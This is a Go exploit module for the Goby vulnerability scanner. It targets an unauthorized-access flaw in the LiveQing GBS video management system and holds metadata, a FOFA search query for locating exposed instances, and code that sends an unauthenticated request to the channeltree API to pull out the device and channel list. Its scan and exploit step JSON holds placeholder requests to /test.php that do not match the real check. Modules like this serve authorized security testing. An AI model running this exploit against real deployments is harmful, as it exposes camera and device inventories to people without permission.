package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "LiveQing GBS channeltree unauthorized access vulnerability",
    "Description": "<p>Qingshi Video Management System is a user management and Web visual page video management platform provided by Qingshi Information Technology. It supports local, intranet, and private cloud deployment; supports Windows and Linux without installation, decompression and one-click startup; supports distributed deployment; complete secondary development Interface documentation; WEB visual management background.</p><p>The system has an unauthorized vulnerability that allows an attacker to access and obtain unauthorized system resources through the network.</p>",
    "Product": "LiveQing GBS",
    "Homepage": "https://www.liveqing.com/",
    "DisclosureDate": "2022-11-06",
    "PostTime": "2023-11-28",
    "Author": "树懒",
    "FofaQuery": "body=\"js/liveplayer-lib.min.js\"",
    "GobyQuery": "body=\"js/liveplayer-lib.min.js\"",
    "Level": "2",
    "Impact": "<p>The system has an unauthorized vulnerability that allows an attacker to access and obtain unauthorized system resources through the network.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.liveqing.com/\">https://www.liveqing.com/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "devices",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "青柿视频管理系统 channeltree 未授权访问漏洞",
            "Product": "青柿视频管理系统",
            "Description": "<p>青柿视频管理系统是青柿信息科技提供用户管理及Web可视化页面视频管理平台，支持本地、内网、私有云部署；支持Windows，Linux免安装，解压一键启动；支持分布式部署；完整二次开发接口文档；WEB可视管理后台。<br></p><p>该系统存在未授权漏洞，攻击者可以利用该漏洞通过网络访问并获取未经授权的系统资源。<br></p>",
            "Recommendation": "<p>1. 官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.liveqing.com/\">https://www.liveqing.com/</a></p><p>2. 通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3. 如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>该系统存在未授权漏洞，攻击者可以利用该漏洞通过网络访问并获取未经授权的系统资源。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "LiveQing GBS channeltree unauthorized access vulnerability",
            "Product": "LiveQing GBS",
            "Description": "<p>Qingshi Video Management System is a user management and Web visual page video management platform provided by Qingshi Information Technology. It supports local, intranet, and private cloud deployment; supports Windows and Linux without installation, decompression and one-click startup; supports distributed deployment; complete secondary development Interface documentation; WEB visual management background.</p><p>The system has an unauthorized vulnerability that allows an attacker to access and obtain unauthorized system resources through the network.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are advised to contact the manufacturer to fix the vulnerability: <a href=\"https://www.liveqing.com/\" target=\"_blank\">https://www.liveqing.com/</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The system has an unauthorized vulnerability that allows an attacker to access and obtain unauthorized system resources through the network.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`
	sendPayloadY83bdGefRdvc39 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		payloadConfig := httpclient.NewGetRequestConfig("/api/v1/device/channeltree?serial=&pcode")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadY83bdGefRdvc39(hostInfo)
			return resp != nil && resp.StatusCode == 200 && strings.HasPrefix(resp.Utf8Html, `[`) && strings.HasSuffix(resp.Utf8Html, `]`) && strings.Contains(resp.Utf8Html, `"customName"`) && strings.Contains(resp.Utf8Html, `"id"`)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "devices" {
				resp, err := sendPayloadY83bdGefRdvc39(expResult.HostInfo)
				if err != nil {
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && strings.HasPrefix(resp.Utf8Html, `[`) && strings.HasSuffix(resp.Utf8Html, `]`) && strings.Contains(resp.Utf8Html, `"customName"`) && strings.Contains(resp.Utf8Html, `"id"`) {
					expResult.Success = true
					expResult.Output = resp.RawBody
				}
			}
			return expResult
		},
	))
}
